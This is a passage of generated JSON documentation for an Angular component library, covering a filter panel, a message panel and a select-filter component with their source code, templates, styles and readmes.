        "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>",
        "templateData": "<mat-expansion-panel [disabled]=\"true\"\r\n                     [expanded]=\"expanded\"\r\n                     #panel\r\n                     [hideToggle]=\"true\"\r\n                     [ngClass]=\"{'sto-filter' : true}\">\r\n  <mat-expansion-panel-header [expandedHeight]=\"'40px'\"\r\n                              [collapsedHeight]=\"'40px'\">\r\n    <mat-panel-title>\r\n      <ng-content select=\"sto-filter-title\"></ng-content>\r\n      <mat-chip-list [style.opacity]=\"panel.expanded ? 0 : 1\"\r\n                     *ngIf=\"filterList\"\r\n                     style=\"margin-left: 16px\">\r\n        <mat-chip (removed)=\"_clearFilter(f.key, f.index)\"\r\n                  *ngFor=\"let f of filterList\"\r\n                  [removable]=\"true\"\r\n                  [selected]=\"true\"\r\n                  [value]=\"f.key\"\r\n                  style=\"margin: 2px 4px\">\r\n          <span style=\"margin-bottom: -4px\">{{ f.value }}</span>\r\n          <mat-icon matChipRemove>cancel</mat-icon>\r\n\r\n        </mat-chip>\r\n      </mat-chip-list>\r\n    </mat-panel-title>\r\n    <span class=\"content-wrapper\"\r\n          #tableActions>\r\n      <ng-content select=\"sto-filter-table-actions\">\r\n\r\n      </ng-content>\r\n\r\n    </span>\r\n\r\n    <span class=\"content-wrapper\"\r\n          #filterActions>\r\n      <sto-filter-actions-bar #contentWrapper2\r\n                              *ngIf=\"expandable\"\r\n                              [expanded]=\"expanded\"\r\n                              [expandable]=\"expandable\"\r\n                              (toggle)=\"toggle()\">\r\n\r\n        <ng-content select=\"sto-filter-actions\"></ng-content>\r\n\r\n      </sto-filter-actions-bar>\r\n    </span>\r\n  </mat-expansion-panel-header>\r\n  <div class=\"sto-filter-form\"\r\n       #filterForm>\r\n    <ng-content></ng-content>\r\n  </div>\r\n</mat-expansion-panel>\r\n\r\n"
      },
      {
        "name": "StoMessagePanelComponent",
        "id": "component-StoMessagePanelComponent-1d058210633b9c1ac603ce65091e6ed89454d3937910276d4d0376aa67e6bbe295140c488618fbe1e3a3553a9270f4cab170631920dc1496a2995673a2c37d77",
        "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-message-panel",
        "styleUrls": [
          "./sto-message-panel.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-message-panel.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "color",
            "defaultValue": "'primary'",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 40,
            "type": "\"primary\" | \"accent\" | \"warning\" | \"danger\" | \"success\"",
            "decorators": []
          },
          {
            "name": "dismissable",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nDetermines if the message can be dismissed - typically used for showing and hiding errors.\n",
            "description": "<p>Determines if the message can be dismissed - typically used for showing and hiding errors.</p>\n",
            "line": 72,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "icon",
            "defaultValue": "'info'",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 64,
            "type": "\"info\" | \"warning\" | \"error\"",
            "decorators": []
          },
          {
            "name": "severity",
            "defaultValue": "'info'",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 62,
            "type": "\"info\" | \"warning\" | \"error\"",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "dismissed",
            "defaultValue": "new EventEmitter()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits an event on (dismissed) when the user clicks the dismiss icon\n",
            "description": "<p>Emits an event on (dismissed) when the user clicks the dismiss icon</p>\n",
            "line": 68,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [],
            "methodsClass": [
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 97,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnChanges",
                "args": [
                  {
                    "name": "changes",
                    "type": "SimpleChanges",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 77,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "changes",
                    "type": "SimpleChanges",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDismissableClass",
                "args": [
                  {
                    "name": "dismissable",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "el",
                    "type": "HTMLElement",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 89,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": "dismissable",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "el",
                    "type": "HTMLElement",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.error",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 53,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "class.info",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 48,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "class.warning",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 43,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectionStrategy,\r\n  Component,\r\n  ElementRef,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnChanges,\r\n  Output,\r\n  SimpleChanges,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\n\r\nconst COLORS = [\r\n  'primary', 'accent', 'warning', 'danger', 'success'\r\n];\r\n\r\n@Component({\r\n  selector: 'sto-message-panel',\r\n  templateUrl: './sto-message-panel.component.html',\r\n  styleUrls: [ './sto-message-panel.component.scss' ],\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  encapsulation: ViewEncapsulation.None\r\n})\r\n/**\r\n * Message panel to display inline info boxes.\r\n * Can be of severity warning, error or info.\r\n *\r\n * @example\r\n *\r\n * <sto-message-panel severity=\"warning\"></sto-message-panel>\r\n * <sto-message-panel severity=\"info\"></sto-message-panel>\r\n * <sto-message-panel severity=\"error\"></sto-message-panel>\r\n * <sto-message-panel *ngIf=\"err\" [dismissable]=\"true\"\r\n *    (dismissed)=\"err = null\" severity=\"warning\">{{ err }}</sto-message-panel>\r\n */\r\nexport class StoMessagePanelComponent implements OnChanges, AfterViewInit {\r\n  @Input()\r\n  color: 'primary' | 'accent' | 'warning' | 'danger' | 'success' = 'primary';\r\n\r\n  @HostBinding('class.warning')\r\n  get warning() {\r\n    return this.severity === 'warning';\r\n  }\r\n\r\n  @HostBinding('class.info')\r\n  get info() {\r\n    return this.severity === 'info';\r\n  }\r\n\r\n  @HostBinding('class.error')\r\n  get error() {\r\n    return this.severity === 'error';\r\n  }\r\n\r\n  /**\r\n   * @deprecated\r\n   * severity was used to signify behaviour. Now you should use icon + color.\r\n   */\r\n  @Input()\r\n  severity: 'info' | 'warning' | 'error' = 'info';\r\n  @Input()\r\n  icon: 'info' | 'warning' | 'error' = 'info';\r\n  /**\r\n   * Emits an event on (dismissed) when the user clicks the dismiss icon\r\n   */\r\n  @Output() dismissed = new EventEmitter();\r\n  /**\r\n   * Determines if the message can be dismissed - typically used for showing and hiding errors.\r\n   */\r\n  @Input() dismissable: boolean;\r\n\r\n  constructor(private elRef: ElementRef<HTMLElement>) {\r\n  }\r\n\r\n  ngOnChanges(changes: SimpleChanges): void {\r\n    const el = this.elRef.nativeElement;\r\n    if ( changes.color ) {\r\n      el.classList.remove(...COLORS.map(c => `mat-${c}`));\r\n      el.classList.add(`mat-${changes.color.currentValue}`);\r\n    }\r\n    if ( changes.dismissable ) {\r\n      const dismissable = changes.dismissable.currentValue;\r\n      this.setDismissableClass(dismissable, el);\r\n    }\r\n  }\r\n\r\n  private setDismissableClass(dismissable: boolean, el: HTMLElement) {\r\n    if ( dismissable ) {\r\n      el.classList.add('sto-message-panel--dismissable');\r\n    } else {\r\n      el.classList.remove('sto-message-panel--dismissable');\r\n    }\r\n  }\r\n\r\n  ngAfterViewInit(): void {\r\n    const color = this.color;\r\n    this.elRef.nativeElement.classList.add(`mat-${color}`, 'sto-message-panel');\r\n    this.setDismissableClass(this.dismissable, this.elRef.nativeElement);\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".sto-message-panel {\r\n  width: 100%;\r\n  border: 1px solid;\r\n  display: flex;\r\n  border-radius: 2px;\r\n  padding: 12px;\r\n\r\n  &--dismissable {\r\n    padding: 4px 12px;\r\n  }\r\n\r\n  position: relative;\r\n  font-weight: 500;\r\n  font-size: 13px;\r\n\r\n  &__content-wrapper {\r\n    align-items: center;\r\n  }\r\n}\r\n\r\n\r\n.sto-message-panel {\r\n  &__icon-wrapper {\r\n    display: flex;\r\n    flex-direction: column;\r\n    justify-content: center;\r\n    height: auto;\r\n    flex-grow: 1;\r\n    min-width: 42px;\r\n    max-width: 42px;\r\n  }\r\n  &__content-wrapper {\r\n    padding-top: 2px;\r\n    flex-grow: 99;\r\n  }\r\n  &__dismiss-wrapper {\r\n    display: flex;\r\n    flex-direction: column;\r\n    justify-content: center;\r\n    height: auto;\r\n    flex-grow: 1;\r\n    max-width: 42px;\r\n  }\r\n}\r\n\r\n::ng-deep ul {\r\n  margin: 0;\r\n  list-style: none;\r\n  padding: 0;\r\n}\r\n\r\n::ng-deep .mat-typography p {\r\n  margin: 0;\r\n}\r\n\r\n//SHOULD BE REWRITTEN OR REMOVE ENCAPSULATION\r\n\r\n.sto-message-panel__sticky {\r\n  position: sticky;\r\n  &--bottom {\r\n    padding-top: 8px;\r\n    bottom: 0;\r\n  }\r\n  &--top {\r\n    top: 0;\r\n    padding-bottom: 8px;\r\n  }\r\n  z-index: 25;\r\n}\r\n\r\n.sto-has-action-footer, .sto-message-panel__pad--bottom {\r\n  .sto-message-panel__sticky--bottom {\r\n    bottom: 76px;\r\n    width: 100%;\r\n  }\r\n}\r\n\r\nsto-message-panel {\r\n  .sto-message-panel__content-wrapper {\r\n    display: flex;\r\n  }\r\n  .sto-message-panel__action-button {\r\n    height: 24px;\r\n    line-height: 24px;\r\n  }\r\n}\r\n",
            "styleUrl": "./sto-message-panel.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 72,
          "jsdoctags": [
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnChanges",
          "AfterViewInit"
        ],
        "accessors": {
          "warning": {
            "name": "warning",
            "getSignature": {
              "name": "warning",
              "type": "",
              "returnType": "",
              "line": 43
            }
          },
          "info": {
            "name": "info",
            "getSignature": {
              "name": "info",
              "type": "",
              "returnType": "",
              "line": 48
            }
          },
          "error": {
            "name": "error",
            "getSignature": {
              "name": "error",
              "type": "",
              "returnType": "",
              "line": 53
            }
          }
        },
        "readme": "<h3 id=\"stomessagepanel\">StoMessagePanel</h3>\n<p>StoMessagePanel is used to display contextual messages using 3 different modes - info, warning and error</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-message-panel [dismissable]=&quot;true|false&quot;\n(dismissed)=&quot;onDismiss()&quot;\ncolor=&quot;primary|accent|warn&quot;&gt;{{ message }}&lt;/sto-message-panel&gt;</code></pre></div><h5 id=\"inputs\">Inputs</h5>\n<ul>\n<li>[dismissable] determines if the alert can be dismissed. Note that the component does not handle dismissing, and you need to use the (dismissed) event yourself.</li>\n<li>[color] determines how the component should be styled. Uses Angular Material&#39;s ThemePalette</li>\n<li>[icon] determines the icon</li>\n</ul>\n<h5 id=\"outputs\">Outputs</h5>\n<ul>\n<li>(dismissed) emits when the close-button (X) is clicked to dismiss the message.</li>\n</ul>\n",
        "templateData": "<div class=\"sto-message-panel__icon-wrapper\">\r\n  <mat-icon>{{ icon + '_outline' || severity }}</mat-icon>\r\n</div>\r\n<div class=\"sto-message-panel__content-wrapper\">\r\n  <ng-content></ng-content>\r\n</div>\r\n<div *ngIf=\"dismissable\"\r\n     class=\"sto-message-panel__dismiss-wrapper mat__icon--clickable\">\r\n  <button mat-icon-button\r\n          (click)=\"dismissed.emit()\">\r\n    <mat-icon>close</mat-icon>\r\n  </button>\r\n</div>\r\n"
      },
      {
        "name": "StoSelectFilterComponent",
        "id": "component-StoSelectFilterComponent-74b2d716d3459f1108d108303dfe1a43b6abc96a075ac47ac56e889358f6b419352b7d4b7490ff31345f81e10b4cc483b87b98a35a1fc34ce384213c4cc0a34a",
        "file": "libs/form/src/lib/sto-select-filter/sto-select-filter.component.ts",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [
          {
            "name": "{\n    provide: NG_VALUE_ACCESSOR, useExisting: forwardRef(() => StoSelectFilterComponent), multi: true\n}",
            "type": "component"
          }
        ],
        "selector": "sto-select-filter",
        "styleUrls": [
          "./sto-select-filter.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-select-filter.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "focusIfNoValue",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nautomatically focus input element if it's empty\n",
            "description": "<p>automatically focus input element if it&#39;s empty</p>\n",
            "line": 137,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "isFilter",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nisFilter determines if filtering is active\n",
            "description": "<p>isFilter determines if filtering is active</p>\n",
            "line": 133,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "isMulti",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nisMulti determines if select all is available\n",
            "description": "<p>isMulti determines if select all is available</p>\n",
            "line": 129,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "selected",
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "pos": 2000,
                "end": 2020,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 338,
                "tagName": {
                  "pos": 2001,
                  "end": 2006,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": "",
                "name": {
                  "pos": 2007,
                  "end": 2015,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "selected"
                },
                "isNameFirst": true,
                "isBracketed": false
              }
            ],
            "rawdescription": "\n\nDetermines the checkbox state. Can be checked, indeterminate or unchecked\n",
            "description": "<p>Determines the checkbox state. Can be checked, indeterminate or unchecked</p>\n",
            "line": 82,
            "type": "number",
            "decorators": []
          },
          {
            "name": "total",
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "pos": 1758,
                "end": 1775,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 338,
                "tagName": {
                  "pos": 1759,
                  "end": 1764,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": "",
                "name": {
                  "pos": 1765,
                  "end": 1770,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "total"
                },
                "isNameFirst": true,
                "isBracketed": false
              }
            ],
            "rawdescription": "\n\nLength of unfiltered Array\n",
            "description": "<p>Length of unfiltered Array</p>\n",
            "line": 70,
            "type": "number",
            "decorators": []
          },
          {
            "name": "value",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nInitial value of the filter\n",
            "description": "<p>Initial value of the filter</p>\n",
            "line": 57,
            "type": "",
            "decorators": []
          }
        ],
            "outputsClass": [
              {
                "name": "selectAll",
                "defaultValue": "new EventEmitter<boolean>()",
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nEmits when selectAll checkbox changes\n",
                "description": "<p>Emits when selectAll checkbox changes</p>\n",
                "line": 120,
                "type": "EventEmitter"
              },
              {
                "name": "valueChanges",
                "defaultValue": "new EventEmitter<unknown>()",
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nEmits when the search value changes\n",
                "description": "<p>Emits when the search value changes</p>\n",
                "line": 124,
                "type": "EventEmitter"
              }
            ],
            "propertiesClass": [
              {
                "name": "_selected",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 115,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_total",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 112,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_value",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 109,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "checkboxControl",
                "defaultValue": "new FormControl()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 104,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "cssClass",
                "defaultValue": "true",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 100,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": "'class.sto-select-filter'"
                  }
                ]
              },
              {
                "name": "destroyed$",
                "defaultValue": "new Subject()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 138,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "indeterminate",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 107,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "inputControl",
                "defaultValue": "new FormControl()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 105,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "inputElement",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLInputElement>",
                "optional": false,
                "description": "",
                "line": 102,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'inputElement'"
                  }
                ],
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "propagateChange",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 155
              },
              {
                "name": "select",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "MatSelect",
                "optional": false,
                "description": "",
                "line": 141,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "isChecked",
                "args": [
                  {
                    "name": "isChecked",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 144,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "name": "isChecked",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 173,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 167,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 183,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "registerOnChange",
                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 159,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnTouched",
                "args": [
                  {
                    "name": "fn",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 164,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "writeValue",
                "args": [
                  {
                    "name": "value",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 149,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "value",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-select-filter",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 100,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "<p>Component used in mat-select&#39;s to filter out the values, and adds a Select all checkbox</p>\n<p>public all = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\npublic filtered = [];\npublic selectAll(checked: boolean) {\n this.control.setValue(checked ? all : []);\n}\npublic filter(val: string) {\n   this.filtered = all.filter(x =&gt; x === val);\n}\n&lt;mat-select [formControl]=&quot;control&quot;&gt;\n  &lt;sto-select-filter (valueChanges)=&quot;filter($event)&quot; (selectAll)=&quot;selectAll($event)&quot;&gt;</sto-select-filter>\n  &lt;mat-option *ngFor=&quot;let v of filtered&quot;&gt;{{ v }}</mat-option>\n</mat-select></p>\n",
        "rawdescription": "\n\nComponent used in mat-select's to filter out the values, and adds a Select all checkbox\n\n\npublic all = [\"a\", \"b\", \"c\"];\npublic filtered = [];\npublic selectAll(checked: boolean) {\n this.control.setValue(checked ? all : []);\n}\npublic filter(val: string) {\n   this.filtered = all.filter(x => x === val);\n}\n<mat-select [formControl]=\"control\">\n  <sto-select-filter (valueChanges)=\"filter($event)\" (selectAll)=\"selectAll($event)\"></sto-select-filter>\n  <mat-option *ngFor=\"let v of filtered\">{{ v }}</mat-option>\n</mat-select>\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  Component,\r\n  ElementRef,\r\n  EventEmitter,\r\n  forwardRef,\r\n  HostBinding,\r\n  Input,\r\n  OnDestroy,\r\n  OnInit,\r\n  Output,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { ControlValueAccessor, FormControl, NG_VALUE_ACCESSOR } from '@angular/forms';\r\nimport { Subject } from 'rxjs';\r\nimport { takeUntil } from 'rxjs/operators';\r\nimport { MatSelect } from '@angular/material/select';\r\n\r\n/**\r\n * Component used in mat-select's to filter out the values, and adds a Select all checkbox\r\n *\r\n * @example\r\n *\r\n * public all = [\"a\", \"b\", \"c\"];\r\n * public filtered = [];\r\n * public selectAll(checked: boolean) {\r\n *  this.control.setValue(checked ? all : []);\r\n * }\r\n * public filter(val: string) {\r\n *    this.filtered = all.filter(x => x === val);\r\n * }\r\n * <mat-select [formControl]=\"control\">\r\n *   <sto-select-filter (valueChanges)=\"filter($event)\" (selectAll)=\"selectAll($event)\"></sto-select-filter>\r\n *   <mat-option *ngFor=\"let v of filtered\">{{ v }}</mat-option>\r\n * </mat-select>\r\n */\r\n\r\n@Component({\r\n  selector: 'sto-select-filter',\r\n  templateUrl: './sto-select-filter.component.html',\r\n  styleUrls: [ './sto-select-filter.component.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  providers: [\r\n    {\r\n      provide: NG_VALUE_ACCESSOR,\r\n      useExisting: forwardRef(() => StoSelectFilterComponent),\r\n      multi: true\r\n    }\r\n  ]\r\n})\r\nexport class StoSelectFilterComponent implements OnInit, AfterViewInit, OnDestroy, ControlValueAccessor {\r\n\r\n  /**\r\n   * Initial value of the filter\r\n   */\r\n  @Input() set value(value: unknown) {\r\n    this._value = value;\r\n    this.writeValue(value);\r\n  }\r\n\r\n  get value(): unknown {\r\n    return this._value;\r\n  }\r\n\r\n  /**\r\n   * Length of unfiltered Array\r\n   * @param total\r\n   */\r\n  @Input() set total(total: number) {\r\n    this._total = total;\r\n  }\r\n\r\n  get total(): number {\r\n    return this._total;\r\n  }\r\n\r\n  /**\r\n   * Determines the checkbox state. Can be checked, indeterminate or unchecked\r\n   * @param selected\r\n   */\r\n  @Input() set selected(selected: number) {\r\n    if ( this.total === selected ) {\r\n      this.isChecked(true);\r\n      this.indeterminate = false;\r\n    } else if ( selected > 0 ) {\r\n      this.indeterminate = true;\r\n      this.isChecked(false);\r\n    } else {\r\n      this.indeterminate = false;\r\n      this.isChecked(false);\r\n    }\r\n    this._selected = selected;\r\n  }\r\n\r\n  get selected(): number {\r\n    return this._selected;\r\n  }\r\n\r\n  @HostBinding('class.sto-select-filter') cssClass = true;\r\n  @ViewChild('inputElement')\r\n  public inputElement: ElementRef<HTMLInputElement>;\r\n\r\n  public checkboxControl = new FormControl();\r\n  public inputControl = new FormControl();\r\n\r\n  public indeterminate: boolean;\r\n\r\n  private _value: unknown;\r\n\r\n\r\n  private _total: number;\r\n\r\n\r\n  private _selected: number;\r\n\r\n  /**\r\n   * Emits when selectAll checkbox changes\r\n   */\r\n  @Output() selectAll = new EventEmitter<boolean>();\r\n  /**\r\n   * Emits when the search value changes\r\n   */\r\n  @Output() valueChanges = new EventEmitter<unknown>();\r\n\r\n  /**\r\n   * isMulti determines if select all is available\r\n   */\r\n  @Input() isMulti: boolean;\r\n  /**\r\n   * isFilter determines if filtering is active\r\n   */\r\n  @Input() isFilter: boolean;\r\n  /**\r\n   * automatically focus input element if it's empty\r\n   */\r\n  @Input() focusIfNoValue: boolean;\r\n  private destroyed$ = new Subject();\r\n\r\n\r\n  constructor(public select: MatSelect) {\r\n  }\r\n\r\n  public isChecked(isChecked: boolean) 